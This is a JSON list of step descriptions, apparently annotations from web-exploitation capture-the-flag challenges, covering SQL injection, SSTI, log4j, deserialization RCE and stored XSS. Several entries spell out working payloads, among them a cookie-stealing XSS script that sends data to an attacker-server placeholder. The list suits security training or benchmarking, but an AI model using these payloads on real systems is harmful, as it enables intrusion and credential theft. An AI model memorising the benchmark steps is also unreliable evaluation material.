[
    "Recognize the visible SQL query as a potential vulnerability hint.",
    "Execute the query '123' UNION SELECT 1, sqlite_version(), 3;--'.",
    "Determine that the server's response suggests Server Side Template Injection.",
    "Access the template files on the server.",
    "Obtain the content of the template files.",
    "Checked the forgot password feature.",
    "Attempted to exploit the log4j vulnerability using the 'ProfileServlet.java'.",
    "Tried to get the flag using the code provided when exploiting the log4j vulnerability.",
    "Researched 'Code Execution through IIFE in node-serialize' advisory",
    "Researched what IIFE (Immediately Invoked Function Expression) is",
    "Injected a malicious payload into the file",
    "Developed a payload to read the flag file",
    "Attempt a Cross-site Scripting (XSS) attack.",
    "Realize that 'eval' can be triggered by entering a payload as the GET query parameter.",
    "Work out bugs in the Python code.",
    "Noticed the output of 'List Storage' command runs 'df -h'.",
    "Confirmed buttons trigger standard Linux commands.",
    "Constructed command '/santa_mon.sh \"curl http://localhost:3000/get_flag\"'.",
    "Identify the potential SSTI vulnerability.",
    "Exploit the SSTI vulnerability using ninjucks.",
    "Identify that the flag is in the same database as the toys, but its approved value is set to 0.",
    "Identify a potential vulnerability to SQL injection.",
    "The application connects to a sqlite database ('const db = new Database('toy_workshop.db');'), so inspect 'database.js'.",
    "This function adds our user provided query to the database and then calls 'bot.readQueries(db)'.",
    "This is a stored cross-site scripting vulnerability, where we can send a malicious script through the frontend to the database and when a user visits the '/queries' page, the server sends the malicious code to the user.",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "Use the Python subprocess library's getoutput() function.",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')).",
    "Notice that the value of FLAG_AUTH is starred out",
    "Discover that the 'auth' cookie was previously set in 'gethash.sh'",
    "Open the file index.html.",
    "Exploit PHP using loose comparison.",
    "Download app.py",
    "Open the website in a web browser",
    "Identify the first part of the flag within a comment",
    "To find the session cookie, set the session's 'admin' field to 'true'.",
    "Run a script with the site's 'secret key' included.",
    "Found no relevant information",
    "Ran code using URL 'http://web.chal.csaw.io:8000/?page=%27%20and%20die(show_source(%27templates/flag.php%27))%20or%20%27'",
    "Recognize the SQL injection vulnerability in the 'id' parameter",
    "Observe the usage of MySQL",
    "Utilize the group_concat() function",
    "Use '' OR 1=1;#' as password for SQL injection",
    "Use LFI to access the code of the 'delete' resource",
    "Extracted the flag from the response",
    "Analyze the application's token verification process",
    "Recognize that the `unserialize` function can lead to Remote Code Execution (RCE)",
    "Develop a Python script",
    "Implement the necessary steps to exploit the vulnerability",
    "Read the content of the /etc/flag.txt file"
]